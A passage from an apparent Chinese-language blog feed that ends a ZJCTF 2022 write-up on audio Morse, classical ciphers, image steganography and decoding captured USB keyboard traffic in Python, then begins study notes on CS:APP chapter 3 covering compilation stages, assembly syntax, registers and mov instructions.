alt="Snipaste_2022-09-24_13-49-19"></p><p>但是发现解压需要密码，爆破无果，看了一会别的题目回到这个题的时候，发现题目一直在强调m4a的文件类型，在010中反复查看，突然注意到开头的mp，发现文件中有好多个m和p字母出现</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-05-44.png" alt="Snipaste_2022-09-24_14-05-44"></p><p>因为没有很明显的文件头和文件尾，脑洞一开猜想会不会是mp3或者mp4，于是改了个文件尾，发现可以打开（打开的一瞬间吓我一跳、、）</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-08-05.png" alt="Snipaste_2022-09-24_14-08-05"></p><p>正经人当然纯靠耳朵听摩斯密码啦（bushi</p><p>打开Au一顿操作猛如虎</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_10-41-52.jpg" alt="Snipaste_2022-09-24_10-41-52"></p><p>翻译一下</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-10-13.png" alt="Snipaste_2022-09-24_14-10-13"></p><p>解码一下</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-11-42.png" alt="Snipaste_2022-09-24_14-11-42"></p><p>拿到压缩包密码，打开压缩包</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-12-38.png" alt="Snipaste_2022-09-24_14-12-38"></p><p>拿到一串字符，交了一下发现错误，文件名是atbash，在瑞士军刀中搜索发现有此方法，拖入后将得到的字符上交，还是错误。</p><p>试了一下签到题里用过的rot13，还是错误，只能将解密库里的解密一个一个试过去，发现居然是47、、（远在天边近在眼前</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-16-16.png" alt="Snipaste_2022-09-24_14-16-16"></p><p>提交得到flag</p><h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p>拿到一张图片<img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-19-27.png" alt="Snipaste_2022-09-24_14-19-27">打开核对文件头文件尾发现尾端多出一部分</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-22-30.png" alt="Snipaste_2022-09-24_14-22-30"></p><p>把尾端多出来的部分拿去解密</p><p>用base64解密后只能看到前面部分，后面依旧是乱码，但是很有规律，结合做题经验发现是我最讨厌的表情符号</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-31-05.png" alt="Snipaste_2022-09-24_13-31-05"></p><p>然后拿key</p><p>用Stegsolve解码下图片</p><p>504B，明显zip文件</p><p><img src="/2022/09/24/ZJCTF-2022/image-20220924143455373.png"></p><p><img src="/2022/09/24/ZJCTF-2022/image-20220924143531149.png"></p><p>处理下文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;./key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lines=f.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> line[:<span class="built_in">len</span>(line)]:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(s,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;:&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>发现是键盘流量，但是格式不太对，写个脚本添加冒号，核对格式后直接套用大佬的脚本</p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-56-16.png" alt="Snipaste_2022-09-24_13-56-16" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">              <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">              <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">              <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">              <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">              <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">             <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">             <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">             <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">             <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;key1.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"> </span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解密</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-28-22.png" alt="Snipaste_2022-09-24_14-28-22"></p><p>提交</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CS:APP第三章复习</title>
      <link href="/2022/09/22/CSAPP_3/"/>
      <url>/2022/09/22/CSAPP_3/</url>
      
        <content type="html"><![CDATA[<p>咕了有点久了，赶紧把新的章节预习完，捡出重点知识写一写文章。</p><span id="more"></span><h2 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h2><h3 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h3><p>Intel 系列处理器俗称 x86，经历了一系列的发展变化，从最初的四位，到16位微处理器 8086，32位的 i386 以及64位的 x86-64。</p><p>摩尔定律：芯片上的晶体管数量没过一年都会增长一倍，而事实正如所预料的这么发展，计算机科学的技术正以指数级的量级发展。</p><p>计算机只能够认识机器语言，只有机器语言能够直接被执行，如今的高级语言提供的抽象级别较高，较高的抽象级别可以提高工作效率，也能提高可靠性，在过渡到低级语言（汇编，机器语言）的时候编译器也能帮助我们发现程序的错误。虽然高级语言在各方面都能碾压低级语言，不论是在前面说的工作效率可靠性，还是可移植性方面。但是并不不是说我们就没有必要学习低级语言了，因为低级语言也由人为创建，也会产生漏洞，如果语言出现底层的逻辑漏洞，那么光从高级语言去查是永远不会查出结果的，这也是我们需要学习低级语言的原因。在了解了汇编语言，机器语言之后，你也会发现，计算机漏洞并不那么难以理解。</p><h3 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h3><p>比如有一个程序：test.c，我们用如下命令编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcc -g test.c -o test</span><br></pre></td></tr></table></figure><p>这样编译出一个可执行的 test 文件，事实上，这一个命令调用了一整套的程序，程序拆解下来大致分为四步：</p><ol><li>预编译</li><li>编译</li><li>汇编</li><li>链接</li></ol><p>预编译会将 #include 所包含的文件展开以及 #define 申明指定的宏，生成 test.i。</p><p>编译会将高级语言翻译为低级语言，也就是汇编语言，生成 test.s。</p><p>汇编会将汇编语言转为对应的机器码，生成可重定向文件 test.o。到了这一步，程序仍不能独立运行，因为它缺少了相应的库函数和程序入口函数 _start 也没有填充全局的地址。</p><p>链接会将目标代码与库(libc.so.6)的代码合并，最终产生可执行文件 test。</p><p>我们可以使用以下四个命令来模拟每一步的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$gcc -E test.c -o test.i</span><br><span class="line">$gcc -S test.i -o test.s</span><br><span class="line">$gcc -c test.s -o test.o</span><br><span class="line">$gcc -g test.o -o test [--static]</span><br></pre></td></tr></table></figure><p>在最后一步链接的时候，我们可以添加参数 –static 进行静态链接，或者不加参数默认动态链接。静态链接时，产生的可执行文件会非常大，而动态链接产生的可执行文件相对较小，每一个静态链接的文件被执行，都会把库函数的代码写进内存当中，而动态链接则不会，因此静态链接比动态链接会耗费更多的内存。但是静态链接的文件可以脱离库(libc.so.6) 运行，而动态链接必须依赖库运行，编译出来的文件放在不同版本的环境运行下可能会有较大差别，因此静态链接的可以执行比动态链接强。</p><h4 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h4><p>对于机器级编程来说，两种抽象比较重要：指令集体系结构或指令架构(ISA)定义了机器级程序的格式和行为，第二种抽象是内存地址为虚拟地址，提供的内存模型是非常大的字节数组。</p><p>一些对 C语言 程序员隐藏的处理状态对于机器代码是可见的。</p><ul><li>程序计数器（PC），在 x86-64 种以 %rip 寄存器表示程序要执行的下一条指令的地址。</li><li>寄存器</li><li>状态寄存器</li><li>向量寄存器</li></ul><p>在汇编代码中，不区分有符号无符号，不区分普通类型和指针类型，而操作系统负责把虚拟地址翻译成实际处理器内存中的物理地址。</p><p>机器执行的程序就是一个字节序列，是对一系列指令的编码，机器对产生这些指令的源代码几乎一无所知。</p><p>如果我们想查看一个可重定向文件或者是可执行 ELF 文件的字节码和它的反汇编指令的话，我们可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d xxx.o</span><br><span class="line">$objdump -d ELFfile</span><br></pre></td></tr></table></figure><p>机器码具有如下特性：</p><ul><li>指令可以从任意地址编码，无对齐规则，只是任意地址开始的编码很可能产生错误的编码或者是运行产生错误的结果。</li><li>指令长度从1-15个字节不等，运用了哈夫曼编码的思想：越常用的指令字节数越少，越不常用的指令字节数越多。</li><li>反汇编器只是根据字节序列确定汇编代码，它完全不需要知道编译出该程序的源文件即可得到。</li></ul><p>汇编代码有 AT&amp;T 和 Intel 两种风格，在本书当中，基本使用的是 AT&amp;T 风格的汇编。</p><table><thead><tr><th>风格区别</th><th>intel</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>注释</td><td>;</td><td>//</td></tr><tr><td>指令</td><td>无后缀</td><td>需要后缀指定数据长度</td></tr><tr><td>立即数</td><td>直接写常数</td><td>需要加$前缀</td></tr><tr><td>寄存器</td><td>直接写寄存器名称</td><td>需要加%前缀</td></tr><tr><td>指令书写风格</td><td>通常源操作数在后，目的在前</td><td>源操作数在前，目的在后</td></tr><tr><td>间接寻址</td><td>方括号里面可以直接写表达式</td><td>圆括号，只能计算ax+y+b的地址</td></tr></tbody></table><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>由于 Intel 用术语 “字(word)”表示16位的数据类型，因此 32 位数被称为 “双字(double words)”，64位数被称为 “四字(quad words)”。</p><p>在多少位的系统当中，指针就是多少位的，因此64位系统当中，指针类型的数据一律是四字，下面给出常见 C 的数据类型和数据长度。</p><table><thead><tr><th>C声明</th><th>Intel数据类型</th><th>汇编代码后缀</th><th>大小（字节）</th></tr></thead><tbody><tr><td>char</td><td>字节</td><td>b</td><td>1</td></tr><tr><td>short</td><td>字</td><td>w</td><td>2</td></tr><tr><td>int</td><td>双字</td><td>l</td><td>4</td></tr><tr><td>long</td><td>四字</td><td>q</td><td>8</td></tr><tr><td>char *</td><td>四字</td><td>q</td><td>8</td></tr><tr><td>float</td><td>单精度</td><td>s</td><td>4</td></tr><tr><td>double</td><td>双精度</td><td>l</td><td>8</td></tr></tbody></table><p>不过这里需要注意的是：虽然双字和双精度的后缀看似起了冲突实则没有冲突，因为浮点运算有自己独立的指令，并不影响。</p><h3 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h3><p>这里需要介绍以下寄存器，16位机器中，我们的通用寄存器有8个：ax,bx,cx,dx,di,si,sp,bp。对于前四个寄存器来说，把 x 替换成l 表示对应寄存器的低八位数据，替换成 h 则表示高 8 位数据。后面发展到了 32 位系统，寄存器也扩展到了 32 位，于是便于区分，在对应寄存器的名字前加上 e（expand 扩展）表示 32 位的寄存器，此时我们仍可以用 ax 表示 eax 的低 16 位，al 表示 eax 的低 8 位。到了 64 位之后，为了区分，把所有的 e 替换成了 r（register 寄存器）。并且新增了 8 个寄存器 r8~r15。</p><p>除此之外还有一个很特殊的寄存器：ip，它指示了当前运行指令的地址，也就是我们广义所称的 PC 程序计数器。</p><h4 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h4><p>以下内容建议全文背诵。</p><p>大多数指令会有一个到两个操作数（operand），操作数可以是立即数（immediate），寄存器（register）或者是内存地址。具有两个操作数的指令会分源操作数（source operand）和目的操作数（destination operand）。</p><p>在有两个操作数的情况下：源操作数可以是以上三种的任意，目的操作数不能为立即数，并且源操作数和目的操作数不能同时为内存地址。</p><p>单操作数指令具体情况具体分析。</p><p>我们主要介绍第三类的操作数，也就是内存地址引用。书上介绍的场景比较多，我们直接介绍最一般的形式：</p><p>$Imm(x,y,z)表示了地址为 x+yz+$Imm 的内存空间。</p><h4 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h4><h5 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h5><p>我们最频繁用到的指令就是数据传送指令了，它的作用就是将源操作数的值传给目的操作数，限制于上面介绍的一样。为了区分不同的版本，我们有 movb,movw,movl,movq 分别表示 传送字节，传送字，传送双字，传送四字。但是需要注意有一个例外，在传送双字（movl）的时候，如果目的操作数为一个寄存器，则此命令会将寄存器的高四个字节全部置为 0。</p><p>而有这么一种情况，当目的寄存器字长较长，而源操作数字长较短时，我们需要对源操作数进行扩展，而扩展就引发了两种情况：符号（sign）扩展（movs）和零（zero）扩展（movz）。这样则又能引发 11 种不同的 mov 指令。从字节扩展到字，双字，四字。从字扩展到双字和四字，零扩展种没有从双字扩展到四字的指令，因为 movl 指令已经能帮我们自动零扩展了。</p><p>因此这里就有五种指令，再符号扩展和零扩展算一下就是 10 